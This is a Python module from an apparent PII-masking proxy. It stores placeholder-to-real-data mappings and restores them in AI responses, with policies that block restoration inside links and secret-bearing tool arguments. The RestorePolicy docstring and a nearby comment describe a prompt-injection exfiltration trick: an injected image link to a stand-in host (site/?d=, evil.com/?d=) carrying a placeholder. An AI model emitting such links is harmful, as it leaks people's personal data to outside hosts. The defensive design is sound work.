"""Cofre: guarda o mapeamento entre os marcadores e os dados reais e restaura textos.

O cofre fica só na memória do processo (ou no arquivo que você salvar pela CLI) e nunca é
enviado ao modelo de IA.
"""

from __future__ import annotations

import hashlib
import hmac
import json
import os
import random
import re
import threading
from collections import Counter
from dataclasses import dataclass

from veu._text import fold, only_digits
from veu.entities import LABELS, SECRET_LABELS

# Rótulos cujos valores são comparados só pelos dígitos ("529.982.247-25" e "52998224725" são o mesmo CPF).
DIGIT_LABELS = frozenset({
    "CPF", "TELEFONE", "CEP", "CARTAO_CREDITO", "PIS", "CNS", "CNH", "TITULO_ELEITOR", "RENAVAM",
    "CONTA_BANCARIA", "PROCESSO",
})
CODE_LABELS = frozenset({"CNPJ", "RG", "PLACA", "PASSAPORTE", "CHAVE_PIX"})

# O colchete final é opcional: modelos às vezes escrevem "[CPF_1" ou "[CPF 1]".
_PLACEHOLDER = r"\[\s*(?P<ph_label>[A-Za-z]+(?:_[A-Za-z]+)*)[_\s-]+(?P<ph_id>[0-9A-Fa-f]{1,16})(?:\s*\]|(?![\w]))"
_BARE = r"(?<![\w\[])(?P<bare_label>[A-Z]+(?:_[A-Z]+)*)_(?P<bare_id>\d{1,6}|[0-9a-f]{16}|[0-9a-f]{8})(?![\w\]])"
# Marcadores que já chegam no texto de entrada (escritos por uma página, um e-mail ou um documento).
_FORGED = re.compile(
    r"\[(?P<open>\s*)(?P<label>[A-Za-z]+(?:_[A-Za-z]+)*)(?P<sep>[_\s-]+)(?P<id>[0-9A-Fa-f]{1,16})(?=\s*\]|(?![\w]))"
)
_TRAILING_WORD = re.compile(r"[A-Za-z0-9_]+$")
_DIGIT_SEPARATOR = r"[\s.\-/()]*"
MAX_HOLDBACK = 48
HASH_HEX = 16  # 64 bits no operador hash


@dataclass(frozen=True, slots=True)
class RestorePolicy:
    """Onde a restauração pode devolver os dados reais.

    links: restaura também dentro de links, imagens e URLs. Desligado por padrão: um texto malicioso lido
        pela IA pode pedir que ela escreva ![x](https://site/?d=[CPF_1]), e o navegador enviaria o CPF real.
    link_hosts: domínios (e subdomínios) cujos links podem receber os dados reais mesmo assim.
    tools: restaura os argumentos das chamadas de ferramenta (o que o agente vai executar).
    secrets_in_tools: restaura chaves de API, tokens e senhas nesses argumentos. Desligado por padrão.
    """

    links: bool = False
    link_hosts: tuple[str, ...] = ()
    tools: bool = True
    secrets_in_tools: bool = False

    def allows(self, label: str, before: str, *, tool: bool) -> bool:
        """Pode restaurar um valor do tipo label, precedido por before (o texto da mesma linha)?"""
        if tool and (not self.tools or (label in SECRET_LABELS and not self.secrets_in_tools)):
            return False
        if self.links:
            return True
        url = link_context(before)
        if url is None:
            return True
        host = url_host(url)
        return bool(host) and any(host == domain or host.endswith("." + domain) for domain in self.link_hosts)


# Começo de uma URL ou de um destino de link no texto que antecede o marcador.
# O último caso é um domínio solto seguido de "/" (evil.com/?d=...), que muitos sites transformam em link.
_URL_START = re.compile(
    r"(?i)\b[a-z][a-z0-9+.\-]*://|\bwww\.|\bmailto:|\]\(\s*<?|(?<![:/\w])//"
    r"|\b[a-z0-9\-]+(?:\.[a-z0-9\-]+)*\.[a-z]{2,24}(?::\d{1,5})?/"
)
_LINK_ATTRIBUTE = re.compile(
    r"(?i)(?:\b(?:src|href|action|formaction|srcset|poster|ping|cite|background|lowsrc|data)\s*=\s*|\burl\(\s*)[\"']?$"
)
_ANGLE_DESTINATION = re.compile(r"\]\(\s*<[^>\n]*$")
_RUN = re.compile(r"[^\s\"'<>`]*$")
_HOST = re.compile(r"(?i)^(?:[a-z][a-z0-9+.\-]*:)?//([^/?#\\\s]*)[/?#\\]")
_JSON_ESCAPE = re.compile(r"\\u([0-9a-fA-F]{4})|\\(/)")


def link_context(before: str) -> str | None:
    """Se o marcador está dentro de um link, imagem ou URL, devolve a URL até ele; senão, None."""
    line = before[before.rfind("\n") + 1:]
    if "\\" in line:  # argumentos de ferramenta em JSON: "https:\/\/..." ou "/"
        line = _JSON_ESCAPE.sub(lambda m: chr(int(m.group(1), 16)) if m.group(1) else "/", line)
    angle = _ANGLE_DESTINATION.search(line)
    if angle:
        return line[line.index("<", angle.start()) + 1:]
    run = _RUN.search(line).group(0)
    start = _URL_START.search(run)
    if start:
        return run[start.end():] if start.group(0).startswith("]") else run[start.start():]
    if _LINK_ATTRIBUTE.search(line[:len(line) - len(run)]):
        return run
    return None


def url_host(url: str) -> str:
    """Domínio de uma URL absoluta, só se ele já terminou (vazio se o marcador está no próprio domínio)."""
    match = _HOST.match(url)
    if not match:
        return ""
    return match.group(1).rsplit("@", 1)[-1].split(":", 1)[0].lower().rstrip(".")


def neutralize_placeholders(text: str, labels: set[str] | frozenset[str] = frozenset()) -> str:
    """Desarma marcadores que já vêm no texto de entrada: [CPF_1] vira [CPF#1].

    Só o Véu cria marcadores. Um marcador escrito por outra pessoa (numa página, num e-mail, num documento)
    não pode virar um dado real quando a IA o repete na resposta.
    """
    if "[" not in text:
        return text

    def replace(match: re.Match) -> str:
        label = match.group("label").upper()
        if label not in LABELS and label not in labels:
            return match.group(0)
        return f"[{match.group('open')}{match.group('label')}{'#' * len(match.group('sep'))}{match.group('id')}"

    return _FORGED.sub(replace, text)


def normalize_value(label: str, value: str) -> str:
    """Forma canônica de um valor, usada para dar o mesmo marcador a grafias diferentes."""
    if label == "TELEFONE":
        digits = only_digits(value)
        return digits[2:] if len(digits) in (12, 13) and digits.startswith("55") else digits
    if label in DIGIT_LABELS:
        return only_digits(value) or fold(value)
    if label in CODE_LABELS:
        return re.sub(r"[^0-9A-Za-z]", "", value).upper()
    if label == "EMAIL":
        return value.strip().casefold()
    return fold(value)


@dataclass(frozen=True, slots=True)
class VaultEntry:
    label: str
    original: str
    replacement: str
    kind: str  # "marcador" ou "sintetico"


class Vault:
    """Mapeamento reversível entre dados reais e o que foi enviado ao modelo."""

    def __init__(self, secret: bytes | None = None, seed: int | None = None, policy: RestorePolicy | None = None):
        self._by_key: dict[tuple[str, str], str] = {}
        self._entries: dict[str, VaultEntry] = {}
        self._counters: Counter[str] = Counter()
        self._secret = secret or os.urandom(32)
        self.policy = policy or RestorePolicy()
        self.rng = random.Random(seed)
        self._pattern: re.Pattern | None = None
        self._digit_surrogates: dict[str, VaultEntry] = {}
        self._text_surrogates: dict[str, VaultEntry] = {}
        # Cofres de sessão são usados por várias requisições ao mesmo tempo: sem a trava, duas
        # requisições poderiam dar o mesmo [CPF_2] a valores diferentes.
        self._lock = threading.RLock()

    # Criação de marcadores
    def lookup(self, label: str, value: str) -> str | None:
        return self._by_key.get((label, normalize_value(label, value)))

    def placeholder(self, label: str, value: str, *, hashed: bool = False) -> str:
        key = (label, normalize_value(label, value))
        with self._lock:
            existing = self._by_key.get(key)
            if existing is not None:
                return existing
            if hashed:
                replacement = f"[{label}_{self.hash_id(label, key[1])}]"
                if replacement in self._entries:  # colisão de 64 bits: improvável, mas nunca troca uma pessoa por outra
                    raise ValueError(f"Colisão no operador hash para {label}. Use outro VEU_SEGREDO.")
            else:
                self._counters[label] += 1
                replacement = f"[{label}_{self._counters[label]}]"
            self._store(key, VaultEntry(label, value, replacement, "marcador"))
            return replacement

    def hash_id(self, label: str, normalized: str) -> str:
        """HMAC-SHA256 com uma chave derivada só para o operador hash (64 bits na saída)."""
        key = hmac.new(self._secret, b"veu/hash/v2", hashlib.sha256).digest()
        return hmac.new(key, f"{label}:{normalized}".encode(), hashlib.sha256).hexdigest()[:HASH_HEX]

    def surrogate(self, label: str, value: str, make) -> str:
        """Substituto sintético e verossímil (por exemplo, outro CPF válido). make(rng) gera o valor."""
        key = (label, normalize_value(label, value))
        with self._lock:
            existing = self._by_key.get(key)
            if existing is not None:
                return existing
            taken = {fold(entry.original) for entry in self._entries.values()} | {fold(r) for r in self._entries}
            for _ in range(20):
                replacement = make(self.rng)
                if replacement and fold(replacement) not in taken and fold(replacement) != fold(value):
                    break
            else:
                return self.placeholder(label, value)
            self._store(key, VaultEntry(label, value, replacement, "sintetico"))
            return replacement

    def alias(self, label: str, value: str, replacement: str) -> None:
        """Faz outro valor (por exemplo, só o primeiro nome) usar um marcador já existente."""
        with self._lock:
            self._by_key.setdefault((label, normalize_value(label, value)), replacement)

    def _store(self, key: tuple[str, str], entry: VaultEntry) -> None:
        self._by_key[key] = entry.replacement
        self._entries[entry.replacement] = entry
        if entry.kind == "sintetico":
            if entry.label in DIGIT_LABELS:
                self._digit_surrogates[only_digits(entry.replacement)] = entry
            else:
                self._text_surrogates[fold(entry.replacement)] = entry
        self._pattern = None

    # Consulta
    def __len__(self) -> int:
        return len(self._entries)

    def __bool__(self) -> bool:
        return True

    def entries(self) -> list[VaultEntry]:
        return list(self._entries.values())

    @property
    def labels(self) -> set[str]:
        return {entry.label for entry in self._entries.values()}

    @property
    def has_placeholders(self) -> bool:
        return any(entry.kind == "marcador" for entry in self._entries.values())

    # Restauração
    def _compiled(self) -> re.Pattern:
        with self._lock:
            return self._build_pattern()

    def _build_pattern(self) -> re.Pattern:
        if self._pattern is None:
            parts = [_PLACEHOLDER, _BARE]
            surrogates = []
            for entry in self._entries.values():
                if entry.kind != "sintetico":
                    continue
                if entry.label in DIGIT_LABELS:
                    digits = only_digits(entry.replacement)
                    surrogates.append(r"(?<!\d)" + _DIGIT_SEPARATOR.join(digits) + r"(?!\d)")
                else:
                    words = [re.escape(word) for word in entry.replacement.split()]
                    surrogates.append(r"(?<![\w@.])(?i:" + r"\s+".join(words) + r")(?![\w@])")
            if surrogates:
                surrogates.sort(key=len, reverse=True)
                parts.append("(?P<sur>" + "|".join(surrogates) + ")")
            self._pattern = re.compile("|".join(parts))
        return self._pattern

    def _entry_for(self, match: re.Match) -> VaultEntry | None:
        if match.group("ph_label"):
            key = f"[{match.group('ph_label').upper()}_{match.group('ph_id').lower()}]"
        elif match.group("bare_label"):
            key = f"[{match.group('bare_label')}_{match.group('bare_id')}]"
        else:
            text = match.group(0)
            return self._digit_surrogates.get(only_digits(text)) or self._text_surrogates.get(fold(text))
        entry = self._entries.get(key)
        return entry if entry and entry.kind == "marcador" else None

    def restore(self, text: str, *, json_escape: bool = False, tool: bool | None = None, prefix: str = "") -> str:
        """Troca marcadores e substitutos pelos valores reais, seguindo a política do cofre (self.policy).

        json_escape: o texto é um pedaço de JSON. tool: o texto é argumento de uma chamada de ferramenta
        (padrão: o mesmo que json_escape). prefix: o texto da mesma linha que já passou (streaming).
        Dentro de links e URLs, e para segredos em argumentos de ferramentas, o marcador fica como está.
        """
        if not text or not self._entries:
            return text
        tool = json_escape if tool is None else tool
        policy = self.policy

        def replace(match: re.Match) -> str:
            entry = self._entry_for(match)
            if entry is None:
                return match.group(0)
            start = match.start()
            newline = text.rfind("\n", 0, start)
            before = prefix + text[:start] if newline == -1 else text[newline + 1:start]
            if not policy.allows(entry.label, before, tool=tool):
                return match.group(0)
            return json.dumps(entry.original, ensure_ascii=False)[1:-1] if json_escape else entry.original

        return self._compiled().sub(replace, text)

    def restore_spans(self, text: str) -> list[tuple[int, int, str]]:
        """(início, fim, valor real) de cada marcador que a política deixa restaurar (para documentos)."""
        spans = []
        for match in self._compiled().finditer(text):
            entry = self._entry_for(match)
            if entry is None:
                continue
            newline = text.rfind("\n", 0, match.start())
            if self.policy.allows(entry.label, text[newline + 1:match.start()], tool=False):
                spans.append((match.start(), match.end(), entry.original))
        return spans

    def restorer(self, *, json_escape: bool = False, tool: bool | None = None) -> StreamRestorer:
        return StreamRestorer(self, json_escape=json_escape, tool=tool)

    def _might_continue(self, tail: str) -> bool:
        """O fim do texto pode ser o começo de um marcador ou substituto que chega no próximo pedaço?"""
        upper = tail.upper()
        if _TRAILING_WORD.fullmatch(tail):
            for label in self.labels:
                prefix = label + "_"
                if prefix.startswith(upper) or upper.startswith(prefix):
                    return True
        folded = fold(tail)
        if folded and any(surrogate.startswith(folded) for surrogate in self._text_surrogates):
            return True
        digits = only_digits(tail)
        if digits and re.fullmatch(r"[\d\s.\-/()]+", tail):
            return any(surrogate.startswith(digits) for surrogate in self._digit_surrogates)
        return False

    def max_surrogate_length(self) -> int:
        return max((len(entry.replacement) for entry in self._entries.values() if entry.kind == "sintetico"),
                   default=0)

    # Persistência (a CLI salva o cofre para restaurar depois). O arquivo contém os dados reais.
    def to_dict(self) -> dict:
        return {
            "versao": 1,
            "itens": [
                {"entidade": e.label, "original": e.original, "substituto": e.replacement, "tipo": e.kind}
                for e in self._entries.values()
            ],
            "chaves": [{"entidade": label, "valor": value, "substituto": rep} for (label, value), rep in self._by_key.items()],
        }

    @classmethod
    def from_dict(cls, data: dict, *, secret: bytes | None = None, policy: RestorePolicy | None = None) -> Vault:
        vault = cls(secret=secret, policy=policy)
        for item in data.get("itens", []):
            entry = VaultEntry(item["entidade"], item["original"], item["substituto"], item.get("tipo", "marcador"))
            vault._store((entry.label, normalize_value(entry.label, entry.original)), entry)
            match = re.fullmatch(r"\[[A-Z_]+_(\d+)\]", entry.replacement)
            if match:
                vault._counters[entry.label] = max(vault._counters[entry.label], int(match.group(1)))
        for item in data.get("chaves", []):
            vault._by_key.setdefault((item["entidade"], item["valor"]), item["substituto"])
        return vault


class StreamRestorer:
    """Restaura uma resposta que chega em pedaços (streaming).

    Um marcador pode chegar dividido ("[PES" + "SOA_1]"): o fim de cada pedaço que ainda pode
    virar um marcador fica retido até o próximo pedaço, ou até flush().
    """

    def __init__(self, vault: Vault, *, json_escape: bool = False, tool: bool | None = None):
        self.vault = vault
        self.json_escape = json_escape
        self.tool = json_escape if tool is None else tool
        self._buffer = ""
        # Texto já emitido na linha atual: um link pode começar num pedaço e o marcador chegar em outro.
        self._line = ""

    def _restore(self, ready: str) -> str:
        output = self.vault.restore(ready, json_escape=self.json_escape, tool=self.tool, prefix=self._line)
        newline = ready.rfind("\n")
        self._line = ready[newline + 1:] if newline != -1 else self._line + ready
        return output

    def feed(self, text: str) -> str:
        if not text:
            return ""
        self._buffer += text
        cut = self._safe_cut(self._buffer)
        ready, self._buffer = self._buffer[:cut], self._buffer[cut:]
        return self._restore(ready)

    def flush(self) -> str:
        ready, self._buffer = self._buffer, ""
        return self._restore(ready)

    @property
    def pending(self) -> bool:
        return bool(self._buffer)

    def _safe_cut(self, text: str) -> int:
        cut = len(text)
        bracket = text.rfind("[")
        if bracket != -1 and "]" not in text[bracket:] and len(text) - bracket <= MAX_HOLDBACK:
            cut = bracket
        longest = min(len(text), max(MAX_HOLDBACK, self.vault.max_surrogate_length()))
        for size in range(longest, 0, -1):
            start = len(text) - size
            if start >= cut:
                break
            if start > 0 and text[start - 1].isalnum() and text[start].isalnum():
                continue
            if self.vault._might_continue(text[start:]):
                cut = start
                break
        return cut
